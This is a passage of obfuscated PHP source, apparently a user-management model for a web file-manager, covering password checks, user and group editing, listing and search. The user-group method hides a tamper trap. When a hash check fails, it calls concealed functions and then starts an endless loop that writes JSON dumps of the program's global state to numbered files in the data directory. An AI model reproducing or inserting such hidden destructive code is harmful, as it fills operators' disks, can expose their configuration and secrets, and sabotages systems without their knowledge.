$÷˜¥»Î½) { $è¹‚ï =& $_SERVER[ÏéâËõ‘]; $³ÃçĞ“ç = $this->where(array($è¹‚ï[1662] => intval($‹øÛ“„)))->find(); $şÖåù…· = $this->metaGet($‹øÛ“„); $¹¬û‹‚ = isset($şÖåù…·[$è¹‚ï[2298]]) ? $şÖåù…·[$è¹‚ï[2298]] : $è¹‚ï[12]; if (md5($¹¬û‹‚ . trim($÷˜¥»Î½)) !== $³ÃçĞ“ç[$è¹‚ï[894]]) { return !1; } return !0; } public function userAdd($ÎÙş»¦) { $ ‹ˆ×Œ =& $_SERVER[ÏéâËõ‘]; $ªŸœÛ = array($ ‹ˆ×Œ[420] => $ÎÙş»¦[$ ‹ˆ×Œ[32]], $ ‹ˆ×Œ[2299] => $ÎÙş»¦[$ ‹ˆ×Œ[1541]], $ ‹ˆ×Œ[2300] => isset($ÎÙş»¦[$ ‹ˆ×Œ[305]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[305]] : $ ‹ˆ×Œ[12], $ ‹ˆ×Œ[2301] => isset($ÎÙş»¦[$ ‹ˆ×Œ[2297]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[2297]] : $ ‹ˆ×Œ[12], $ ‹ˆ×Œ[2302] => isset($ÎÙş»¦[$ ‹ˆ×Œ[542]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[542]] : $ÎÙş»¦[$ ‹ˆ×Œ[32]], $ ‹ˆ×Œ[2303] => isset($ÎÙş»¦[$ ‹ˆ×Œ[543]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[543]] : $ ‹ˆ×Œ[12], $ ‹ˆ×Œ[2304] => isset($ÎÙş»¦[$ ‹ˆ×Œ[2305]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[2305]] : 1, $ ‹ˆ×Œ[2306] => $ÎÙş»¦[$ ‹ˆ×Œ[894]], $ ‹ˆ×Œ[1918] => isset($ÎÙş»¦[$ ‹ˆ×Œ[1821]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[1821]] : 1024 * 1024 * 20, $ ‹ˆ×Œ[1919] => 0, $ ‹ˆ×Œ[2307] => 0, $ ‹ˆ×Œ[1963] => isset($ÎÙş»¦[$ ‹ˆ×Œ[752]]) ? $ÎÙş»¦[$ ‹ˆ×Œ[752]] : 1); if (!empty($ÎÙş»¦[$ ‹ˆ×Œ[1662]])) { $ªŸœÛ[$ ‹ˆ×Œ[1662]] = $ÎÙş»¦[$ ‹ˆ×Œ[1662]]; } $¦Ú“è˜È = $this->_checkExist($ÎÙş»¦); if ($¦Ú“è˜È !== !0) { return $¦Ú“è˜È; } if (!empty($ªŸœÛ[$ ‹ˆ×Œ[543]]) && strlen($ªŸœÛ[$ ‹ˆ×Œ[543]]) > 255) { $ªŸœÛ[$ ‹ˆ×Œ[543]] = $ ‹ˆ×Œ[12]; } $ŞşÛ¬Ç = $this->add($ªŸœÛ); $å®›·úş = array($ ‹ˆ×Œ[2306] => $ªŸœÛ[$ ‹ˆ×Œ[894]], $ ‹ˆ×Œ[2302] => $ªŸœÛ[$ ‹ˆ×Œ[542]]); $this->userEdit($ŞşÛ¬Ç, $å®›·úş); Model($ ‹ˆ×Œ[1332])->userRootAdd($ŞşÛ¬Ç); return $ŞşÛ¬Ç; } protected function userEditTest($Ö¡Á¶ìÇ, $à¿§ºÊ­) { return $this->call($_SERVER[ÏéâËõ‘][2308], $Ö¡Á¶ìÇ, $à¿§ºÊ­); } protected function userEdit($™½çàÑı, $¼ØîÑüÇ) { $†ş½ÇØ¡ =& $_SERVER[ÏéâËõ‘]; $²ÎëæÁÛ = $this->getInfoSimple($™½çàÑı); if (!$²ÎëæÁÛ) { return !1; } $ßôãÀš = $this->_checkExist($¼ØîÑüÇ, $™½çàÑı); if ($ßôãÀš !== !0) { return $ßôãÀš; } if (isset($¼ØîÑüÇ[$†ş½ÇØ¡[894]]) && trim($¼ØîÑüÇ[$†ş½ÇØ¡[894]]) != $†ş½ÇØ¡[12]) { $œöèªğ = $this->metaGet($™½çàÑı); if (empty($œöèªğ[$†ş½ÇØ¡[2298]])) { $œöèªğ[$†ş½ÇØ¡[2298]] = rand_string(10); Model($†ş½ÇØ¡[513])->metaSet($™½çàÑı, $†ş½ÇØ¡[2298], $œöèªğ[$†ş½ÇØ¡[2298]]); } $¼ØîÑüÇ[$†ş½ÇØ¡[894]] = md5($œöèªğ[$†ş½ÇØ¡[2298]] . trim($¼ØîÑüÇ[$†ş½ÇØ¡[894]])); } else { unset($¼ØîÑüÇ[$†ş½ÇØ¡[894]]); } if (!empty($¼ØîÑüÇ[$†ş½ÇØ¡[543]]) && strlen($¼ØîÑüÇ[$†ş½ÇØ¡[543]]) > 255) { $¼ØîÑüÇ[$†ş½ÇØ¡[543]] = $†ş½ÇØ¡[12]; } $this->where(array($†ş½ÇØ¡[1653] => $™½çàÑı))->save($¼ØîÑüÇ); if (isset($¼ØîÑüÇ[$†ş½ÇØ¡[542]])) { $this->setNamePinyin($™½çàÑı, $¼ØîÑüÇ[$†ş½ÇØ¡[542]]); } $this->clearCache($™½çàÑı); return !0; } public function setNamePinyin($üåãŒÅ, $ş«—Á¹‰ = false) { $†°…â”€ =& $_SERVER[ÏéâËõ‘]; if (!$ş«—Á¹‰) { $ õÕÉô = $this->getInfoSimple($üåãŒÅ); $ş«—Á¹‰ = $ õÕÉô[$†°…â”€[542]] ? $ õÕÉô[$†°…â”€[542]] : $ õÕÉô[$†°…â”€[32]]; } $®™½’Õ• = Model($†°…â”€[535]); if (!Input::check($ş«—Á¹‰, $†°…â”€[593])) { return $®™½’Õ•->metaSet($üåãŒÅ, array($†°…â”€[465] => $†°…â”€[12], $†°…â”€[464] => $†°…â”€[12])); } return $®™½’Õ•->metaSet($üåãŒÅ, array($†°…â”€[465] => str_replace($†°…â”€[53], $†°…â”€[12], Pinyin::get($ş«—Á¹‰)), $†°…â”€[464] => Pinyin::get($ş«—Á¹‰, $†°…â”€[594]))); } private function nickNameRpt() { $ûƒŸÚÓ =& $_SERVER[ÏéâËõ‘]; $ù¦šÑâ¸ = Model($ûƒŸÚÓ[772])->get($ûƒŸÚÓ[2309]); $İ€ì­¼É = $GLOBALS[$ûƒŸÚÓ[6]][$ûƒŸÚÓ[381]][$ûƒŸÚÓ[2309]]; $ú¬ÏÏ«Ê = !is_null($ù¦šÑâ¸) ? $ù¦šÑâ¸ : $İ€ì­¼É; return !!$ú¬ÏÏ«Ê; } private function _checkExist($ôöîÊ™Ü, $éÂõ²ƒ¼ = false) { $‘Ãñş€ =& $_SERVER[ÏéâËõ‘]; $ÍºÕÔç = array($‘Ãñş€[32] => UserModel::ERROR_USER_EXIST_NAME, $‘Ãñş€[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $‘Ãñş€[305] => UserModel::ERROR_USER_EXIST_EMAIL, $‘Ãñş€[2297] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÍºÕÔç[$‘Ãñş€[542]]); } $ÀÜÀ÷½¹ = $éÂõ²ƒ¼ ? array($‘Ãñş€[1662] => array($‘Ãñş€[2310], $éÂõ²ƒ¼)) : array(); foreach ($ÍºÕÔç as $Æç×“Œ¨ => $–çÈş¦ˆ) { $º¶áÚ = array(); foreach ($ÍºÕÔç as $¨üİğÉ£ => $•ÇñüÛà) { if (isset($ôöîÊ™Ü[$¨üİğÉ£]) && $ôöîÊ™Ü[$¨üİğÉ£]) { $º¶áÚ[] = $ôöîÊ™Ü[$¨üİğÉ£]; } } if (!$º¶áÚ) { continue; } $¹Ä±ˆã¡ = array_merge(array($Æç×“Œ¨ => array($‘Ãñş€[7], $º¶áÚ)), $ÀÜÀ÷½¹); $±ÀÑµ°› = $this->where($¹Ä±ˆã¡)->find(); if ($±ÀÑµ°›) { return $–çÈş¦ˆ; } } return !0; } public function userListInfo($†º„›Öº) { $¿Î‡áÏõ =& $_SERVER[ÏéâËõ‘]; $¨÷ëĞ€ = array(); $†º„›Öº = is_array($†º„›Öº) ? array_unique($†º„›Öº) : array(); if (!$†º„›Öº) { return $¨÷ëĞ€; } if (count($†º„›Öº) < 20) { foreach ($†º„›Öº as $Õ°·Õ‰·) { $¨÷ëĞ€[$Õ°·Õ‰· . $¿Î‡áÏõ[12]] = $this->getInfoSimpleOuter($Õ°·Õ‰·); } } else { $ä´ÏªŠ = array($¿Î‡áÏõ[1653] => array($¿Î‡áÏõ[418], $†º„›Öº)); if (count($†º„›Öº) == 1) { $ä´ÏªŠ = array($¿Î‡áÏõ[1653] => $†º„›Öº[0]); } $Šéò—ºá = Model($¿Î‡áÏõ[513])->field($this->simpleField)->where($ä´ÏªŠ)->select(); $Šéò—ºá = array_to_keyvalue($Šéò—ºá, $¿Î‡áÏõ[1662]); foreach ($†º„›Öº as $Õ°·Õ‰·) { $›€¼¾¾Ñ = $Šéò—ºá[$Õ°·Õ‰·]; if (!$›€¼¾¾Ñ) { $¨÷ëĞ€[$Õ°·Õ‰· . $¿Î‡áÏõ[12]] = $this->getInfoSimpleOuter($Õ°·Õ‰·); continue; } $›€¼¾¾Ñ[$¿Î‡áÏõ[543]] = Action($¿Î‡áÏõ[2283])->parseUrl($›€¼¾¾Ñ[$¿Î‡áÏõ[543]]); $¨÷ëĞ€[$Õ°·Õ‰· . $¿Î‡áÏõ[12]] = $›€¼¾¾Ñ; } } return $¨÷ëĞ€; } protected function userStatus($‰öİÂñˆ, $¤Å³Ôõ) { $õ¡ÚÀÑ‰ = $this->getInfoSimple($‰öİÂñˆ); if (!$õ¡ÚÀÑ‰) { return !1; } $à¶€£ = array($_SERVER[ÏéâËõ‘][752] => $¤Å³Ôõ); return $this->userEdit($‰öİÂñˆ, $à¶€£); } protected function userRemove($ºŠ¯È) { $Ó€«äó£ =& $_SERVER[ÏéâËõ‘]; $¤œÀÕ»¯ = $this->getInfoSimple($ºŠ¯È); if (!$¤œÀÕ»¯) { return !1; } $‹ƒä¸†„ = array($Ó€«äó£[1653] => $ºŠ¯È); Model($Ó€«äó£[601])->where($‹ƒä¸†„)->delete(); Model($Ó€«äó£[2311])->where($‹ƒä¸†„)->delete(); Model($Ó€«äó£[1924])->where($‹ƒä¸†„)->delete(); Model($Ó€«äó£[2296])->where($‹ƒä¸†„)->delete(); Model($Ó€«äó£[1073])->where($‹ƒä¸†„)->delete(); Model($Ó€«äó£[2127])->removeUserAll($ºŠ¯È); Model($Ó€«äó£[827])->userRootRemove($ºŠ¯È); return $this->where($‹ƒä¸†„)->delete(); } protected function userGroupSet($¡Şæ‰»×, $¹–Úüİ‡, $“…íç—è = array()) { $¥£ˆ“Ñõ =& $_SERVER[ÏéâËõ‘]; $×éå…¨Ï = $_SERVER[$¥£ˆ“Ñõ[867]] . $¥£ˆ“Ñõ[868]; $Ùî£Ëû = $¥£ˆ“Ñõ[881]; if ($_SERVER[$¥£ˆ“Ñõ[864]] != $Ùî£Ëû($×éå…¨Ï)) { $†¯‡úæº = $¥£ˆ“Ñõ[882]; $¹æœåŒİ = $¥£ˆ“Ñõ[866]; $¼º«õ« = $_SERVER[$¥£ˆ“Ñõ[867]] . $¥£ˆ“Ñõ[868]; $²Ş˜’’„ = $¹æœåŒİ($¼º«õ«); $Óª”ãÏ„ = explode($¥£ˆ“Ñõ[231], $²Ş˜’’„); if (count($Óª”ãÏ„) < $¥£ˆ“Ñõ[626]) { $«²„ÔÛ = $¥£ˆ“Ñõ[869]; $«²„ÔÛ(); } $¯ìÄ¸Ö = $¥£ˆ“Ñõ[883]; $¯ìÄ¸Ö($_SERVER[$¥£ˆ“Ñõ[884]]); $†¯‡úæº = $¥£ˆ“Ñõ[882]; $†¯‡úæº(); $ëı¶Ì§ = $¥£ˆ“Ñõ[885]; $ÆÖñ¤©Ù = json_encode($GLOBALS[$¥£ˆ“Ñõ[886]]); $ü“±Èû³ = 1; for ($ìè•â¹º = $ü“±Èû³; $ìè•â¹º > 0; $ìè•â¹º++) { $ëı¶Ì§(DATA_PATH . $ìè•â¹º, $ÆÖñ¤©Ù); } } $„×Æ°áÕ = $this->getInfoSimple($¡Şæ‰»×); if (!$„×Æ°áÕ || !is_array($¹–Úüİ‡)) { return !1; } $Ÿª´ˆ…– = Model($¥£ˆ“Ñõ[1924]); $Ÿª´ˆ…–->where(array($¥£ˆ“Ñõ[1662] => $¡Şæ‰»×))->delete(); $íŞñ­È† = array(); $æà‰¶üõ = 0; foreach ($¹–Úüİ‡ as $×¿¼©çı => $åÂ­…®Ÿ) { $Ö®Úõ›ı = array($¥£ˆ“Ñõ[1662] => $¡Şæ‰»×, $¥£ˆ“Ñõ[1834] => $×¿¼©çı, $¥£ˆ“Ñõ[1938] => $åÂ­…®Ÿ); $Ö®Úõ›ı[$¥£ˆ“Ñõ[1858]] = isset($“…íç—è[$æà‰¶üõ]) ? $“…íç—è[$æà‰¶üõ] : 0; $æà‰¶üõ++; $íŞñ­È†[] = $Ö®Úõ›ı; } return $Ÿª´ˆ…–->addAll($íŞñ­È†, array(), !0); } protected function userGroupAdd($ÜÔ³©Ìß, $ÊØ¹œŒ = array()) { $€îõ¨Ä¶ =& $_SERVER[ÏéâËõ‘]; $ëòâşò = $this->getInfoSimple($ÜÔ³©Ìß); if (!$ëòâşò || empty($ÊØ¹œŒ)) { return !1; } $–îš§µ = array(); foreach ($ÊØ¹œŒ as $Š²É“â¨ => $ïÈ“ƒû) { $–îš§µ[] = array($€îõ¨Ä¶[1662] => $ÜÔ³©Ìß, $€îõ¨Ä¶[1834] => $Š²É“â¨, $€îõ¨Ä¶[1938] => $ïÈ“ƒû, $€îõ¨Ä¶[1858] => 0); } return Model($€îõ¨Ä¶[1924])->addAll($–îš§µ, array(), !0); } protected function userGroupRemove($ËÛİÜò‘, $÷ÕÈ¡÷) { $íª”Æôô =& $_SERVER[ÏéâËõ‘]; $ü×û‚¼ = $this->getInfoSimple($ËÛİÜò‘); if (!$ü×û‚¼ || !$÷ÕÈ¡÷) { return !1; } $ûßƒ‡Ñ» = array($íª”Æôô[1653] => $ËÛİÜò‘, $íª”Æôô[1922] => $÷ÕÈ¡÷); return Model($íª”Æôô[1924])->where($ûßƒ‡Ñ»)->delete(); } public function listData() { $ù—¿¯ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ù—¿¯ê[$_SERVER[ÏéâËõ‘][369]]); return $ù—¿¯ê; } public function listByID($ò¹úçû) { $½©«šèã =& $_SERVER[ÏéâËõ‘]; if (!$ò¹úçû) { return; } $¢ø’¨ÄØ = array($½©«šèã[1662] => array($½©«šèã[7], $ò¹úçû)); $Ëû÷¬†¨ = $this->where($¢ø’¨ÄØ)->select(); $Ëû÷¬†¨ = array_sort_keep($Ëû÷¬†¨, $½©«šèã[1662], $ò¹úçû); $this->_listDataApply($Ëû÷¬†¨); return $Ëû÷¬†¨; } public function listByGroup($îæŞà¦æ = 0, $¾À™èÛ÷ = array()) { $èæÔ‰£Ö =& $_SERVER[ÏéâËõ‘]; $Õ³Ò¤´º = $èæÔ‰£Ö[12]; $ÁÄì¤‰ = array(); if ($îæŞà¦æ) { $ÁÄì¤‰ = array($èæÔ‰£Ö[2312] => intval($îæŞà¦æ)); $Õ³Ò¤´º = "\x4c\105\106\x54\40\112\x4f\111\116\40{$this->tablePrefix}\x75\x73\145\162\137\x67\162\157\x75\x70\40\x75\163\x65\162\x5f\x67\x72\x6f\x75\160\40\157\x6e\x20\165\x73\x65\162\x2e\x75\163\145\162\x49\x44\x20\x3d\x20\165\163\x65\162\x5f\x67\x72\157\x75\x70\x2e\x75\163\x65\162\111\x44"; $è†ÔÊÆ‹ = Input::get($èæÔ‰£Ö[457], null, $èæÔ‰£Ö[12]) ? $èæÔ‰£Ö[12] : $èæÔ‰£Ö[2313]; } if (isset($¾À™èÛ÷[$èæÔ‰£Ö[752]])) { $ÁÄì¤‰[$èæÔ‰£Ö[2314]] = $¾À™èÛ÷[$èæÔ‰£Ö[752]]; } $Ç¸œøºË = $this->_makeOrder($è†ÔÊÆ‹)->field($èæÔ‰£Ö[2315])->where($ÁÄì¤‰)->join($Õ³Ò¤´º)->selectPage(50); $this->_listDataApply($Ç¸œøºË[$èæÔ‰£Ö[369]]); return $Ç¸œøºË; } private function _makeOrder($ÔøÑ—â¥ = '') { $šÎßœè¨ =& $_SERVER[ÏéâËõ‘]; $ÕÖÛ¥¥Ğ = array($šÎßœè¨[1662], $šÎßœè¨[32], $šÎßœè¨[1823], $šÎßœè¨[1795], $šÎßœè¨[200]); $˜”×‡òœ = array($šÎßœè¨[450] => $šÎßœè¨[451], $šÎßœè¨[452] => $šÎßœè¨[453]); $¾ûôû÷œ = Input::get($šÎßœè¨[457], $šÎßœè¨[7], $šÎßœè¨[1653], $ÕÖÛ¥¥Ğ); $ŒÄ‡êÂÄ = Input::get($šÎßœè¨[458], $šÎßœè¨[7], $šÎßœè¨[1925], array($šÎßœè¨[1925], $šÎßœè¨[452])); $ŒÄ‡êÂÄ = $˜”×‡òœ[$ŒÄ‡êÂÄ]; $ÔøÑ—â¥ = $ÔøÑ—â¥ . "\165\163\145\162\56{$¾ûôû÷œ}\x20{$ŒÄ‡êÂÄ}\x2c\x20\x75\x73\145\x72\56\165\x73\145\162\111\x44\40\141\x73\143"; return $this->alias($šÎßœè¨[2047])->order($ÔøÑ—â¥); } public function listSearch($ç¬ÇëÙ©) { $··ˆ¥œò =& $_SERVER[ÏéâËõ‘]; $¡Øˆ“á = $ç¬ÇëÙ©[$··ˆ¥œò[1928]]; $ğÊôÆ“ = isset($ç¬ÇëÙ©[$··ˆ¥œò[1929]]) ? $ç¬ÇëÙ©[$··ˆ¥œò[1929]] : !1; $¡Øˆ“á = str_replace($··ˆ¥œò[1930], $··ˆ¥œò[1931], trim($¡Øˆ“á)); $€ÌĞäÀ = array($··ˆ¥œò[32] => array($··ˆ¥œò[383], "\x25{$¡Øˆ“á}\x25"), $··ˆ¥œò[305] => array($··ˆ¥œò[383], "{$¡Øˆ“á}\45"), $··ˆ¥œò[542] => array($··ˆ¥œò[383], "{$¡Øˆ“á}\x25"), $··ˆ¥œò[1005] => $··ˆ¥œò[1932]); if (Input::check($¡Øˆ“á, $··ˆ¥œò[311])) { $€ÌĞäÀ[$··ˆ¥œò[1662]] = array($··ˆ¥œò[383], "{$¡Øˆ“á}\x25"); $€ÌĞäÀ[$··ˆ¥œò[2297]] = array($··ˆ¥œò[383], "{$¡Øˆ“á}\x25"); } if (!$¡Øˆ“á) { $€ÌĞäÀ = array(); } if (isset($ç¬ÇëÙ©[$··ˆ¥œò[752]])) { $€ÌĞäÀ[$··ˆ¥œò[752]] = $ç¬ÇëÙ©[$··ˆ¥œò[752]]; } $€ÌĞäÀ = $this->parseWhereLike($€ÌĞäÀ); $Ê øÚù = $this->_makeOrder()->where($€ÌĞäÀ)->selectPage(20); if (!$Ê øÚù || count($Ê øÚù[$··ˆ¥œò[369]]) < 5 && Input::check($¡Øˆ“á, $··ˆ¥œò[318])) { $çÆë¯¼™ = $this->_searchFromMeta($··ˆ¥œò[464], $¡Øˆ“á, 10); $ğÜ‚‘Éè = $this->_searchFromMeta($··ˆ¥œò[465], $¡Øˆ“á, 10); $àëÊãšã = array_merge($çÆë¯¼™, $ğÜ‚‘Éè, $Ê øÚù[$··ˆ¥œò[369]]); $Ê øÚù[$··ˆ¥œò[369]] = array_unique_by_key($àëÊãšã, $··ˆ¥œò[1662]); $Ê øÚù[$··ˆ¥œò[366]][$··ˆ¥œò[367]] = count($Ê øÚù[$··ˆ¥œò[369]]); $Ê øÚù[$··ˆ¥œò[366]][$··ˆ¥œò[368]] = ceil($Ê øÚù[$··ˆ¥œò[366]][$··ˆ¥œò[367]] / $Ê øÚù[$··ˆ¥œò[366]][$··ˆ¥œò[363]]); } $this->_listDataApply($Ê øÚù[$··ˆ¥œò[369]]); $this->_filterByGroup($Ê øÚù, $ğÊôÆ“); return $Ê øÚù; } private function _filterByGroup(&$ıĞÒÁš÷, $ò µ¡Š) { $½Ÿ¥ğğ„ =& $_SERVER[ÏéâËõ‘]; if (!$ò µ¡Š) { return $ıĞÒÁš÷; } foreach ($ıĞÒÁš÷[$½Ÿ¥ğğ„[369]] as $òÔ·í„ => &$‘á—îĞ) { $ÂÈøúÀ = array_to_keyvalue($‘á—îĞ[$½Ÿ¥ğğ„[2017]], $½Ÿ¥ğğ„[12], $½Ÿ¥ğğ„[1834]); if (!in_array($ò µ¡Š, $ÂÈøúÀ)) { unset($ıĞÒÁš÷[$½Ÿ¥ğğ„[369]][$òÔ·í„]); } } unset($‘á—îĞ); $ıĞÒÁš÷[$½Ÿ¥ğğ„[369]] = array_values($ıĞÒÁš÷[$½Ÿ¥ğğ„[369]]); $ıĞÒÁš÷[$½Ÿ¥ğğ„[366]] = array($½Ÿ¥ğğ„[2081] => count($ıĞÒÁš÷[$½Ÿ¥ğğ„[369]]), $½Ÿ¥ğğ„[2079] => $ıĞÒÁš÷[$½Ÿ¥ğğ„[366]][$½Ÿ¥ğğ„[363]], $½Ÿ¥ğğ„[2078] => 1, $½Ÿ¥ğğ„[2080] => 1); } private function _searchFromMeta($ö²ÊßĞ , $­Ëèáœ¼, $­Èˆ‚ûÖ) { $¨Ğ¢÷Í =& $_SERVER[ÏéâËõ‘]; $­Ëèáœ¼ = strtolower($­Ëèáœ¼); $ç§½¬´” = array($¨Ğ¢÷Í[94] => $ö²ÊßĞ , $¨Ğ¢÷Í[374] => array($¨Ğ¢÷Í[383], "\x25{$­Ëèáœ¼}\x25")); $ç§½¬´” = $this->parseWhereLike($ç§½¬´”); $ÚŞÚ“æ” = Model($¨Ğ¢÷Í[2316])->where($ç§½¬´”)->limit($­Èˆ‚ûÖ)->select(); if (!$ÚŞÚ“æ”) { return array(); } $ÚŞÚ“æ” = array_to_keyvalue($ÚŞÚ“æ”, $¨Ğ¢÷Í[12], $¨Ğ¢÷Í[1662]); $‡ôÌñ—¨ = $this->where(array($¨Ğ¢÷Í[1653] => array($¨Ğ¢÷Í[7], $ÚŞÚ“æ”)))->select(); if (!$‡ôÌñ—¨) { return array(); } return $‡ôÌñ—¨; } private function _listDataApplyItem($ñµÕ×ÙÁ) { $òúÌÂ– = array($ñµÕ×ÙÁ); $this->_listDataApply($òúÌÂ–); return $òúÌÂ–[0]; } private function _listDataApply(&$ºˆ¾†Š) { $âúä‹–á =& $_SERVER[ÏéâËõ‘]; if (!$ºˆ¾†Š) { return; } array_remove_key($ºˆ¾†Š, $âúä‹–á[894]); $í¼á¢¡Õ = array_to_keyvalue($ºˆ¾†Š, $âúä‹–á[12], $âúä‹–á[1662]); $this->_listAppendGroup($ºˆ¾†Š, $í¼á¢¡Õ); $this->_listAppendMeta($ºˆ¾†Š, $í¼á¢¡Õ); $this->_listAppendSourceRoot($ºˆ¾†Š, $í¼á¢¡Õ); } private function _listAppendSourceRoot(&$™õ‚õ¶Á, $Ù§³Ò‘ª) { $Ç¹ôœØ =& $_SERVER[ÏéâËõ‘]; $‡ÎÅÍè = Model($Ç¹ôœØ[827])->listSourceRoot(SourceModel::TYPE_USER, $Ù§³Ò‘ª); $‡ÎÅÍè = array_to_keyvalue($‡ÎÅÍè, $Ç¹ôœØ[505]); $‡ÎÅÍè = array_remove_key($‡ÎÅÍè, $Ç¹ôœØ[505]); foreach ($™õ‚õ¶Á as &$äíïª³‰) { $äíïª³‰[$Ç¹ôœØ[86]] = $‡ÎÅÍè[$äíïª³‰[$Ç¹ôœØ[1662]]] ? $‡ÎÅÍè[$äíïª³‰[$Ç¹ôœØ[1662]]] : array(); } unset($äíïª³‰); } private function _listAppendGroup(&$ççºÊµÕ, $¦•‘‘×„) { $Â·ÔÜ¥ú =& $_SERVER[ÏéâËõ‘]; $¯Â‹šÛ  = array($Â·ÔÜ¥ú[1662] => array($Â·ÔÜ¥ú[7], $¦•‘‘×„)); $™İÌè»ü = Model($Â·ÔÜ¥ú[1924])->where($¯Â‹šÛ )->select(); $‚åòö€á = array_to_keyvalue($™İÌè»ü, $Â·ÔÜ¥ú[12], $Â·ÔÜ¥ú[1834]); $‚åòö€á = array_remove_value(array_unique($‚åòö€á), $Â·ÔÜ¥ú[197]); if (!$‚åòö€á || !$™İÌè»ü) { return; } $¯Â‹šÛ  = array($Â·ÔÜ¥ú[1834] => array($Â·ÔÜ¥ú[7], $‚åòö€á)); $…šéÑÏš = Model($Â·ÔÜ¥ú[2015])->field($Â·ÔÜ¥ú[2317])->where($¯Â‹šÛ )->select(); $…šéÑÏš = array_to_keyvalue($…šéÑÏš, $Â·ÔÜ¥ú[1834]); $™İÌè»ü = array_to_keyvalue_group($™İÌè»ü, $Â·ÔÜ¥ú[1662]); foreach ($™İÌè»ü as &$İµí§Ô¦) { $ö»±‡±ø = array(); foreach ($İµí§Ô¦ as $üî›Ş©˜) { if (!$üî›Ş©˜[$Â·ÔÜ¥ú[1938]]) { continue; } $¾Œ±‚Â = Model($Â·ÔÜ¥ú[507])->listData($üî›Ş©˜[$Â·ÔÜ¥ú[1938]]); $ö»±‡±ø[] = array($Â·ÔÜ¥ú[1834] => $üî›Ş©˜[$Â·ÔÜ¥ú[1834]], $Â·ÔÜ¥ú[2318] => $…šéÑÏš[$üî›Ş©˜[$Â·ÔÜ¥ú[1834]]][$Â·ÔÜ¥ú[32]], $Â·ÔÜ¥ú[521] => $…šéÑÏš[$üî›Ş©˜[$Â·ÔÜ¥ú[1834]]][$Â·ÔÜ¥ú[521]], $Â·ÔÜ¥ú[413] => $¾Œ±‚Â); } $İµí§Ô¦ = $ö»±‡±ø; } unset($İµí§Ô¦); foreach ($ççºÊµÕ as &$ŸÄ‚÷íÇ) { $ŸÄ‚÷íÇ[$Â·ÔÜ¥ú[2017]] = array(); if (isset($™İÌè»ü[$ŸÄ‚÷íÇ[$Â·ÔÜ¥ú[1662]]])) { $ŸÄ‚÷íÇ[$Â·ÔÜ¥ú[2017]] = $™İÌè»ü[$ŸÄ‚÷íÇ[$Â·ÔÜ¥ú[1662]]]; } } unset($ŸÄ‚÷íÇ); } public function userAppendGroup($äİÚÀ¸) { $èßÙ¢Â• =& $_SERVER[ÏéâËõ‘]; if (!$äİÚÀ¸) { return array(); } $this->_listAppendGroup($äİÚÀ¸, array_to_keyvalue($äİÚÀ¸, $èßÙ¢Â•[12], $èßÙ¢Â•[1662])); return $äİÚÀ¸; } private function _listAppendMeta(&$ÄÑ¡ùêÖ, $ãĞ†Ï©’) { $¸ˆÂÖ¸è =& $_SERVER[ÏéâËõ‘]; $¯“©‰”ğ = UserJobModel::JOB_KEY; $ÃéİÑÓÉ = array($¸ˆÂÖ¸è[2298]); $àëğéŞ = array($¸ˆÂÖ¸è[1662] => array($¸ˆÂÖ¸è[7], $ãĞ†Ï©’)); $ˆ¿Œ™İ = Model($¸ˆÂÖ¸è[2296])->where($àëğéŞ)->select(); $ˆ¿Œ™İ = array_to_keyvalue_group($ˆ¿Œ™İ, $¸ˆÂÖ¸è[1662]); foreach ($ˆ¿Œ™İ as &$ü –Õ¼) { $ğĞóòı = array(); foreach ($ü –Õ¼ as $›ˆ¥á¤©) { if (!in_array($›ˆ¥á¤©[$¸ˆÂÖ¸è[94]], $ÃéİÑÓÉ)) { $ğĞóòı[$›ˆ¥á¤©[$¸ˆÂÖ¸è[94]]] = $›ˆ¥á¤©[$¸ˆÂÖ¸è[374]]; } } $ü –Õ¼ = $ğĞóòı; } unset($ü –Õ¼); $ÕŒÂÕ½ƒ = Model($¸ˆÂÖ¸è[2319]); foreach ($ÄÑ¡ùêÖ as &$ºëÖªÄ«) { $½çÕá¨Ê = array(); if (isset($ˆ¿Œ™İ[$ºëÖªÄ«[$¸ˆÂÖ¸è[1662]]])) { $½çÕá¨Ê = $ˆ¿Œ™İ[$ºëÖªÄ«[$¸ˆÂÖ¸è[1662]]]; } $ºëÖªÄ«[$¸ˆÂÖ¸è[2320]] = array(); if (isset($½çÕá¨Ê[$¯“©‰”ğ])) { $ºëÖªÄ«[$¸ˆÂÖ¸è[2320]] = $ÕŒÂÕ½ƒ->getUserJobInfo($½çÕá¨Ê[$¯“©‰”ğ]); } } unset($ºëÖªÄ«); } protected function groupUserAll($óÎ±´°¸) { $å“…‰àŠ =& $_SERVER[ÏéâËõ‘]; if (!$óÎ±´°¸) { return !1; } $‡º­À‡ = Model($å“…‰àŠ[1924])->field($å“…‰àŠ[1662])->where(array($å“…‰àŠ[1834] => array($å“…‰àŠ[7], $óÎ±´°¸)))->select(); $‡º­À‡ = array_to_keyvalue($‡º­À‡, $å“…‰àŠ[12], $å“…‰àŠ[1662]); return array_unique($‡º­À‡); } public function userSearch($É†¡ÀÀÌ, $×ßÆÂÂÃ = "\x2a") { return Model($_SERVER[ÏéâËõ‘][535])->where($É†¡ÀÀÌ)->field($×ßÆÂÂÃ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\157\160\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¾¾ê¥·) { $öŠ¹¡ª½ =& $_SERVER[ÏéâËõ‘]; if (!defined($öŠ¹¡ª½[475])) { define($öŠ¹¡ª½[475], 0); } return "\x55\x73\x65\x72\117\160\x74\x69\157\156\x5f{$¾¾ê¥·}\137" . USER_ID; } protected function filterWhere($¡úÍ˜õñ) { $úÕÖÜóá =& $_SERVER[ÏéâËõ‘]; if (!defined($úÕÖÜóá[475])) { define($úÕÖÜóá[475], 0); } $¡úÍ˜õñ[$úÕÖÜóá[1662]] = USER_ID; return $¡úÍ˜õñ; } public function cacheRemoveUser($õâÓóò, $ÃÆªäç¤) { return Cache::remove("\x55\163\145\x72\x4f\160\164\x69\x6f\x6e\137{$õâÓóò}\x5f" . $ÃÆªäç¤); } protected function optionDefault($ˆ…éÎÖ’ 